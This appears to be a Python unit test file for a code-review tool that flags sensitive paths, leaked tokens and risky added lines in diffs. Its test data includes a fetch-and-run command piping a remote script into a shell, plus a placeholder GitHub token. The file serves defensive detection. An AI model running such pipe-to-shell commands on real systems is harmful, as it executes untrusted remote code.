"""Tests for the provider-free Streamiov native reviewer."""
import unittest

from ai.review.independent_reviewer import (
    classify_changed_path,
    parse_name_status,
    scan_added_lines,
)


class NativeReviewerPolicyTests(unittest.TestCase):
    def test_provider_and_control_plane_changes_are_flagged(self):
        for path in (
            ".github/workflows/release.yml",
            "scripts/autonomous/run_issue.py",
            "ai/providers/cloudflare_worker.py",
            "ai/security/permissions.py",
            "wrangler.toml",
        ):
            with self.subTest(path=path):
                finding = classify_changed_path(path)
                self.assertIsNotNone(finding)
                self.assertEqual(finding.severity, "high")

    def test_private_credentials_and_environment_files_are_critical(self):
        for path in ("keys/signing.pem", "config/client.key", ".env.production"):
            with self.subTest(path=path):
                finding = classify_changed_path(path)
                self.assertIsNotNone(finding)
                self.assertEqual(finding.severity, "critical")

    def test_name_status_parses_add_modify_delete_and_rename(self):
        parsed = parse_name_status(
            "A\tai/new.py\nM\tREADME.md\nD\told.txt\nR100\told.py\tnew.py\n"
        )
        self.assertEqual(parsed, ["README.md", "ai/new.py", "new.py", "old.py", "old.txt"])

    def test_added_secret_signatures_are_critical(self):
        diff = (
            "diff --git a/config.py b/config.py\n"
            "--- a/config.py\n+++ b/config.py\n"
            "@@ -1,0 +1 @@\n"
            "+TOKEN = \"ghp_abcdefghijklmnopqrstuvwxyz1234567890\"\n"
        )
        findings = scan_added_lines(diff)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "critical")
        self.assertEqual(findings[0].code, "github-token")

    def test_risky_added_execution_patterns_are_high(self):
        diff = (
            "diff --git a/setup.sh b/setup.sh\n"
            "--- a/setup.sh\n+++ b/setup.sh\n"
            "@@ -1,0 +1 @@\n"
            "+curl https://example.invalid/install.sh | sh\n"
        )
        findings = scan_added_lines(diff)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "high")
        self.assertEqual(findings[0].code, "shell-pipe-to-interpreter")

    def test_removed_unsafe_lines_do_not_trigger_added_line_scan(self):
        diff = (
            "diff --git a/setup.sh b/setup.sh\n"
            "--- a/setup.sh\n+++ b/setup.sh\n"
            "@@ -1 +0,0 @@\n"
            "-curl https://example.invalid/install.sh | sh\n"
        )
        self.assertEqual(scan_added_lines(diff), [])

    def test_clean_documentation_path_is_not_flagged(self):
        self.assertIsNone(classify_changed_path("docs/AI_REVIEW.md"))


if __name__ == "__main__":
    unittest.main()
